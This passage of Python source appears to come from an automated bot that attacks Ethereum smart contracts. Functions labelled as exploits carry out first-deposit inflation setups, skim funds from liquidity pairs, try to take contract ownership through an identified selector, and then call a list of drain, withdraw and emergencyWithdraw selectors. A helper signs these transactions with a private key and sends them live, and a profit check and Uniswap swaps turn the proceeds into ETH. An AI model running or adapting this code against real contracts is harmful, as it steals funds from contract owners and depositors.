    tx_hash = w3.eth.send_raw_transaction(signed_swap.rawTransaction)
    
    # Wait for swap to complete
    w3.eth.wait_for_transaction_receipt(tx_hash)
    
    return nonce + 1 # Return new nonce


def _swap_token_to_eth(w3: Web3, account, token_in: str, nonce: int) -> Optional[str]:
    """Swap Token -> ETH (via WETH) on Uniswap V3"""
    # 1. Read balance
    token_contract = w3.eth.contract(address=token_in, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
    balance = token_contract.functions.balanceOf(account.address).call()
    
    if balance == 0:
        print("[SWAP] No tokens to swap back.", flush=True)
        return nonce

    print(f"[SWAP] Swapping {balance} {token_in} -> ETH...", flush=True)

    # 2. Get Quote
    fee = 3000
    amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)
    
    if amount_out_quoted == 0:
        fee = 500
        amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)
        
    if amount_out_quoted == 0:
        fee = 10000
        amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)

    amount_out_min = int(amount_out_quoted * 0.995) if amount_out_quoted > 0 else 0
    print(f"[SWAP] Quote: {amount_out_quoted} ETH. Min: {amount_out_min}. Fee: {fee}", flush=True)

    # 3. Approve Router
    approve_sig = bytes.fromhex("095ea7b3")
    router_padded = UNISWAP_V3_ROUTER[2:].zfill(64)
    amount_padded = hex(balance)[2:].zfill(64)
    app_data = approve_sig + bytes.fromhex(router_padded) + bytes.fromhex(amount_padded)
    
    _send_tx(w3, account, token_in, 0, app_data, nonce)
    nonce += 1
    
    # 4. Swap Token -> WETH
    params = (
        token_in,
        WETH_ADDRESS,
        fee,
        account.address,
        int(time.time()) + 60,
        balance,
        amount_out_min, # Slippage Enforced
        0
    )
    encoded_params = encode(
        ['(address,address,uint24,address,uint256,uint256,uint256,uint160)'],
        [params]
    )
    data = bytes.fromhex("414bf389") + encoded_params
    
    tx_hash = _send_tx(w3, account, UNISWAP_V3_ROUTER, 0, data, nonce)
    if tx_hash:
        w3.eth.wait_for_transaction_receipt(tx_hash)
    nonce += 1
    
    # 5. Unwrap WETH -> ETH
    weth_contract = w3.eth.contract(address=WETH_ADDRESS, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
    weth_bal = weth_contract.functions.balanceOf(account.address).call()
    
    if weth_bal > 0:
        unwrap_sig = bytes.fromhex("2e1a7d4d")
        amt_padded = hex(weth_bal)[2:].zfill(64)
        u_data = unwrap_sig + bytes.fromhex(amt_padded)
        tx_hash = _send_tx(w3, account, WETH_ADDRESS, 0, u_data, nonce)
        return tx_hash # Return last tx hash
        
    return None


def _resolve_token_simple(w3: Web3, contract_address: str) -> Optional[str]:
    for sel in ["asset()", "token()", "underlying()"]:
        try:
            data = w3.keccak(text=sel)[:4]
            res = w3.eth.call({"to": contract_address, "data": data})
            if len(res) >= 32:
                addr = w3.to_checksum_address(res[-20:])
                if int(addr, 16) != 0:
                    return addr
        except:
            pass
    return None


def _exploit_first_deposit(w3: Web3, account, target: str, nonce: int, bug_type: str, details: Dict[str, Any]) -> Optional[str]:
    print(f"[EXPLOIT] Executing First Deposit (Inflation Attack Setup) for {target}...", flush=True)
    
    # Resolve Token
    token_address = _resolve_token_simple(w3, target)
    amount = 1 # 1 wei
    
    if token_address:
        print(f"[EXPLOIT] Resolved underlying token: {token_address}", flush=True)
        # 1. Swap ETH -> Token (Need tiny amount)
        t_c = w3.eth.contract(address=token_address, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
        bal = t_c.functions.balanceOf(account.address).call()
        if bal < amount:
            nonce = _swap_eth_to_token(w3, account, token_address, 1000000000000000, nonce) # Swap 0.001 ETH
            bal = t_c.functions.balanceOf(account.address).call()
            
        # 2. Approve
        approve_sig = bytes.fromhex("095ea7b3")
        target_padded = target[2:].zfill(64)
        amount_padded = hex(bal)[2:].zfill(64)
        app_data = approve_sig + bytes.fromhex(target_padded) + bytes.fromhex(amount_padded)
        _send_tx(w3, account, token_address, 0, app_data, nonce)
        nonce += 1
        
        # 3. Deposit
        dep_sig = bytes.fromhex("b6b55f25")
        amt_padded = hex(amount)[2:].zfill(64)
        tx_hash = _send_tx(w3, account, target, 0, dep_sig + bytes.fromhex(amt_padded), nonce)
        
        if not tx_hash:
             mint_sig = bytes.fromhex("a0712d68")
             tx_hash = _send_tx(w3, account, target, 0, mint_sig + bytes.fromhex(amt_padded), nonce)
        return tx_hash
    else:
        print(f"[EXPLOIT] No token resolved. Assuming ETH Vault.", flush=True)
        deposit_sig = bytes.fromhex("d0e30db0")
        tx_hash = _send_tx(w3, account, target, amount, deposit_sig, nonce)
        if not tx_hash:
             tx_hash = _send_tx(w3, account, target, amount, b'', nonce)
        return tx_hash


def _exploit_phantom_recovery(w3: Web3, account, target: str, nonce: int, details: Dict[str, Any]) -> Optional[str]:
    """
    Recover funds from phantom address by deploying the pair and skimming.
    """
    recovery = details.get("recovery", {})
    factory_name = recovery.get("factory", "Unknown")
    
    print(f"[EXPLOIT] Executing Phantom Recovery for {factory_name}...", flush=True)
    
    # 1. Resolve Factory Address and Init Code
    from scanner.recovery import FACTORIES
    
    factory_data = FACTORIES.get(factory_name)
    if not factory_data:
        print(f"[EXPLOIT] Unknown factory {factory_name}. Aborting.", flush=True)
        return None
        
    factory_addr = factory_data["address"]
    token0 = recovery.get("token0")
    token1 = recovery.get("token1")
    
    if not token0 or not token1:
        print("[EXPLOIT] Missing tokens for recovery.", flush=True)
        return None
        
    # 2. Deploy Pair (createPair)
    # createPair(address tokenA, address tokenB) -> address pair
    # Selector: c9c65396
    print(f"[EXPLOIT] Deploying Pair {token0} / {token1} on {factory_addr}...", flush=True)
    
    create_sig = bytes.fromhex("c9c65396")
    t0_padded = token0[2:].zfill(64)
    t1_padded = token1[2:].zfill(64)
    data = create_sig + bytes.fromhex(t0_padded) + bytes.fromhex(t1_padded)
    
    # Send Create Tx
    tx_hash_create = _send_tx(w3, account, factory_addr, 0, data, nonce)
    if not tx_hash_create:
        print("[EXPLOIT] createPair failed!", flush=True)
        return None
    
    print(f"[EXPLOIT] Create Tx Sent: {tx_hash_create}. Waiting for confirmation...", flush=True)
    
    # Wait for it to confirm so the code exists
    try:
        w3.eth.wait_for_transaction_receipt(tx_hash_create, timeout=30)
    except Exception as e:
        print(f"[EXPLOIT] Create Tx confirmation failed: {e}", flush=True)
        # Proceed anyway? If it failed, skim will fail (revert). Safe to try.
    
    nonce += 1
    
    # 3. Skim (skim(address to))
    # Selector: bc25cf77
    print(f"[EXPLOIT] Skimming funds to {account.address}...", flush=True)
    skim_sig = bytes.fromhex("bc25cf77")
    to_padded = account.address[2:].zfill(64)
    skim_data = skim_sig + bytes.fromhex(to_padded)
    
    # Target is the PAIR ADDRESS (which is the 'target' argument passed to this function)
    tx_hash_skim = _send_tx(w3, account, target, 0, skim_data, nonce)
    
    if tx_hash_skim:
        print(f"[EXPLOIT] Skim Tx Sent: {tx_hash_skim}. SUCCESS!", flush=True)
        return tx_hash_skim
        
    return None

def _exploit_generic_deposit_withdraw(w3: Web3, account, target: str, nonce: int, bug_type: Optional[str] = None, details: Optional[Dict[str, Any]] = None) -> Optional[str]:
    """
    Generic Deposit (0.0001 ETH) -> Withdraw (Smart)
    """
    # SAFETY CHECK: Run local simulation first
    is_safe, withdraw_method, simulated_profit, token_address = _check_withdrawal_safety(w3, target, bug_type, details)
    if not is_safe:
        print(f"[EXPLOIT] Safety check failed for {target}. Aborting to save funds.", flush=True)
        return None

    estimated_gas = 700000 if token_address else 200000
    total_fee_per_gas, priority_fee, gas_cost = _compute_dynamic_fees(w3, estimated_gas, simulated_profit)

    gross_profit = simulated_profit
    net_profit_wei = gross_profit - gas_cost
    potential_usd = _wei_to_usd(w3, gross_profit)
    gas_usd = _wei_to_usd(w3, gas_cost)
    net_profit_usd = _wei_to_usd(w3, net_profit_wei)

    if net_profit_usd < MIN_NET_PROFIT_USD:
        print(f"[SKIP] Below break-even. Potential: ${potential_usd:.2f}, Gas: ${gas_usd:.2f}", flush=True)
        return None
    
    print(f"[EXPLOIT] Profit found: {gross_profit} wei. Net after gas: {net_profit_wei} wei (~${net_profit_usd:.2f}). Proceeding...", flush=True)

    # TOKEN PATH
    if token_address:
        print(f"[EXPLOIT] Initiating Token Flow for {token_address}...", flush=True)
        # 1. Swap ETH -> Token
        nonce = _swap_eth_to_token(w3, account, token_address, SAFE_DEPOSIT_AMOUNT, nonce)
        
        # 2. Get Balance
        token_contract = w3.eth.contract(address=token_address, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
        my_tokens = token_contract.functions.balanceOf(account.address).call()
        print(f"[EXPLOIT] Swapped. New Token Balance: {my_tokens}", flush=True)

        # 3. Approve Target
        approve_sig = bytes.fromhex("095ea7b3")
        target_padded = target[2:].zfill(64)
        amount_padded = hex(my_tokens)[2:].zfill(64)
        app_data = approve_sig + bytes.fromhex(target_padded) + bytes.fromhex(amount_padded)
        _send_tx(w3, account, token_address, 0, app_data, nonce)
        nonce += 1
        
        print(f"[EXPLOIT] Depositing {my_tokens} tokens...", flush=True)
        
        # Try deposit(uint256)
        dep_sig = bytes.fromhex("b6b55f25")
        amt_padded = hex(my_tokens)[2:].zfill(64)
        
        # Try primary method first?
        # Let's just try deposit(uint256) then deposit(uint256, address)
        tx_hash = _send_tx(w3, account, target, 0, dep_sig + bytes.fromhex(amt_padded), nonce)
        
        if not tx_hash:
             # Try deposit(uint256, address)
             dep_sig2 = bytes.fromhex("6e553f65")
             addr_padded = account.address[2:].zfill(64)
             tx_hash = _send_tx(w3, account, target, 0, dep_sig2 + bytes.fromhex(amt_padded) + bytes.fromhex(addr_padded), nonce)
             
        if not tx_hash:
             # Try mint(uint256) - a0712d68
             mint_sig = bytes.fromhex("a0712d68")
             tx_hash = _send_tx(w3, account, target, 0, mint_sig + bytes.fromhex(amt_padded), nonce)
             
        if not tx_hash:
             print("[EXPLOIT] Token deposit failed.", flush=True)
             return None
             
        nonce += 1
        
        # 4. Withdraw
        print(f"[EXPLOIT] Withdrawing...", flush=True)
        # Try withdraw(uint256)
        with_sig = bytes.fromhex("2e1a7d4d")
        tx_hash = _send_tx(w3, account, target, 0, with_sig + bytes.fromhex(amt_padded), nonce)
        nonce += 1
        
        # 5. Swap Token -> ETH
        last_tx = _swap_token_to_eth(w3, account, token_address, nonce)
        return last_tx

    # ETH PATH
    else:
        # Step 1: Deposit
        print(f"[EXPLOIT] Attempting Generic ETH Deposit {SAFE_DEPOSIT_AMOUNT} wei -> Withdraw...", flush=True)
        
        # 1. Deposit
        # Try 'deposit()' -> d0e30db0
        deposit_sig = bytes.fromhex("d0e30db0") 
        
        print(f"[EXPLOIT] Attempting specific 'deposit()' call...", flush=True)
        tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, deposit_sig, nonce)
        
        # Fallback: If deposit() failed, try Raw ETH Send (receive/fallback)
        if not tx_hash:
            print("[EXPLOIT] Standard 'deposit()' failed or reverted. Attempting Raw ETH send (fallback)...", flush=True)
            tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, b'', nonce)

        # Flexible Entry (New Selectors)
        if not tx_hash:
             # stake() -> 3a4b66f1
             print("[EXPLOIT] Trying stake()...", flush=True)
             tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, bytes.fromhex("3a4b66f1"), nonce)
             
        if not tx_hash:
             # contribute() -> c1cbb378
             print("[EXPLOIT] Trying contribute()...", flush=True)
             tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, bytes.fromhex("c1cbb378"), nonce)

        if not tx_hash:
            print("[EXPLOIT] All deposit methods failed. Aborting.", flush=True)
            return None

        # 2. Withdraw using the method confirmed by simulation
        print(f"[EXPLOIT] Deposit successful. Attempting withdraw using confirmed method: {withdraw_method}...", flush=True)
        
    data = b''
    
    if withdraw_method == "withdraw(uint256)":
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
        
    elif withdraw_method == "withdraw()":
        data = bytes.fromhex("3ccfd60b")
        
    elif withdraw_method == "withdrawAll()":
        data = bytes.fromhex("853828b6")
        
    elif withdraw_method == "redeem(uint256)":
        # redeem(uint256 assets, address receiver, address owner)
        # Selector: ba087652
        selector = bytes.fromhex("ba087652")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        addr_padded = account.address[2:].zfill(64)
        data = selector + bytes.fromhex(amount_padded) + bytes.fromhex(addr_padded) + bytes.fromhex(addr_padded)
        
    elif withdraw_method and withdraw_method.startswith("deep_search_"):
         # Extract selector
         selector_hex = withdraw_method.split("_")[-1] # "0x..."
         print(f"[EXPLOIT] Using Deep Search selector: {selector_hex}", flush=True)
         data = bytes.fromhex(selector_hex[2:])
         if selector_hex.lower() == "0xbc25cf77": # skim(address)
             data += bytes.fromhex(account.address[2:].zfill(64))
         
    else:
        # Default fallback
        print(f"[EXPLOIT] Unknown method '{withdraw_method}', defaulting to withdraw(uint256)", flush=True)
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
    
    return _send_tx(w3, account, target, 0, data, nonce + 1)


def _exploit_sync_loss(w3: Web3, account, target: str, nonce: int) -> Optional[str]:
    print(f"[EXPLOIT] Attempting Sync Loss exploit on {target}...", flush=True)
    
    # 1. Try sync() -> fff6cae9
    sync_sig = bytes.fromhex("fff6cae9")
    tx_hash = _send_tx(w3, account, target, 0, sync_sig, nonce)
    
    if not tx_hash:
        # 2. Try skim(to) -> bc25cf77
        skim_sig = bytes.fromhex("bc25cf77")
        addr_padded = account.address[2:].zfill(64)
        data = skim_sig + bytes.fromhex(addr_padded)
        tx_hash = _send_tx(w3, account, target, 0, data, nonce)
        
    return tx_hash

def _exploit_ghost_liquidity(w3: Web3, account, target: str, nonce: int, details: Optional[Dict[str, Any]]) -> Optional[str]:
    print(f"[EXPLOIT] Attempting Ghost Liquidity exploit on {target}...", flush=True)
    
    # 1. Take Ownership via identified selector
    if details and "selector" in details:
        selector_str = details["selector"] # e.g. "0xc4d66de8"
        print(f"[EXPLOIT] Using identified selector {selector_str} to take ownership...", flush=True)
        try:
            sel_bytes = bytes.fromhex(selector_str[2:])
            # Pad our address to 32 bytes
            my_addr_padded = bytes.fromhex(account.address[2:].zfill(64))
            payload = sel_bytes + my_addr_padded
            
            tx_hash = _send_tx(w3, account, target, 0, payload, nonce)
            if tx_hash:
                print(f"[EXPLOIT] Ownership claim TX sent: {tx_hash}. Waiting...", flush=True)
                try:
                    w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
                    nonce += 1
                except:
                    pass
        except Exception as e:
            print(f"[EXPLOIT] Failed to construct ownership payload: {e}", flush=True)

    # 2. Try to Withdraw / Drain (as Owner)
    print(f"[EXPLOIT] Attempting to drain funds as (potential) Owner...", flush=True)
    
    # withdraw() -> 3ccfd60b
    # withdrawAll() -> 853828b6
    # drain() -> 895d5c3b
    # emergencyWithdraw() -> 5314782a
    # recover() -> 8ce31533
    
    drain_sigs = [
        "3ccfd60b", # withdraw()
        "853828b6", # withdrawAll()
        "895d5c3b", # drain()
        "5314782a", # emergencyWithdraw()
        "8ce31533", # recover()
    ]

    last_tx = None
    for sig in drain_sigs:
        print(f"[EXPLOIT] Trying drain signature 0x{sig}...", flush=True)
        tx_hash = _send_tx(w3, account, target, 0, bytes.fromhex(sig), nonce)
        if tx_hash:
            last_tx = tx_hash
            # If one succeeds, we might want to stop or keep trying others? 
            # Usually one drain is enough, but let's just return the first successful hash for tracking.
            nonce += 1
            # Check if we got money? (Async check in main loop handles this)
            
    # Also try generic claim/reward just in case
    # Try claim() -> 4e71d92d
    if not last_tx:
        tx_hash = _send_tx(w3, account, target, 0, bytes.fromhex("4e71d92d"), nonce)
        if tx_hash: return tx_hash
    
    return last_tx

def _exploit_context_leak(w3: Web3, account, target: str, nonce: int) -> Optional[str]:
    print(f"[EXPLOIT] Attempting Context Leak check on {target}...", flush=True)
    # Multicall check
    # We will try to call 'multicall' with a harmless payload (balanceOf) just to see if it executes.
    # To truly exploit, we would need to delegatecall to a malicious logic, which requires a contract deployment.
    # Here we just 'poke' it.
    
    # multicall(bytes[] data) -> ac9650d8
    # We send empty array for now just to trigger the function
    # bytes[] -> offset 0x20 -> length 0
    data = bytes.fromhex("ac9650d8") + bytes.fromhex("00"*31 + "20") + bytes.fromhex("00"*32)
    
    tx_hash = _send_tx(w3, account, target, 0, data, nonce)
    return tx_hash

def _send_tx(w3: Web3, account, to: str, value: int, data: bytes, nonce: int) -> Optional[str]:
    """
    Helper to sign and send transaction with safety checks.
    """
    try:
        value = int(value)

        # Check for Zero and ETH-required methods
        if value == 0 and len(data) >= 4:
            sel = data[:4].hex()
            if sel in ["d0e30db0", "3a4b66f1", "c1cbb378"]: # deposit, stake, contribute
                print(f"[FIX] Value is 0 for method {sel}, forcing 1 wei.", flush=True)
                value = 1

        print(f"DEBUG_TX: to={to}, value={value}, type={type(value)}", flush=True)
        print(f"!!! CRITICAL DEBUG: to={to}, value={value}", flush=True)

        # 1. Force Gas (EIP-1559 Mode)
        gas_limit = 1500000
        
        # Get current fees
        try:
            block = w3.eth.get_block('latest')
            base_fee = block.get('baseFeePerGas', 1000000000) # Default 1 gwei
        except:
            base_fee = 1000000000
            
        max_prio = 100000000 # 0.1 gwei
        max_fee = int(base_fee * 2 + max_prio)

        tx = {
            "from": account.address,
            "to": to,
            "value": value,
            "data": data,
            "nonce": nonce,
            "gas": gas_limit,
            "maxFeePerGas": max_fee,
            "maxPriorityFeePerGas": max_prio,
            "chainId": w3.eth.chain_id,
            "type": 2
        }
        
        print(f"[EXPLOIT] Signing Raw TX for {to}...", flush=True)
        signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        print(f"[EXPLOIT] Sent TX: {to} | Val: {value} | Hash: {tx_hash.hex()}", flush=True)
        return tx_hash.hex()
        
    except Exception as e:
        gas_dbg = None
        try:
            gas_dbg = gas_limit
        except Exception:
            try:
                gas_dbg = gas_est
            except Exception:
                gas_dbg = None
        print(f"[DEBUG] value={value}, gas={gas_dbg}, price={MAX_FEE_PER_GAS}", flush=True)
        print(f"[EXPLOIT] Simulation/Send failed for {to}: {e}", flush=True)
        return None
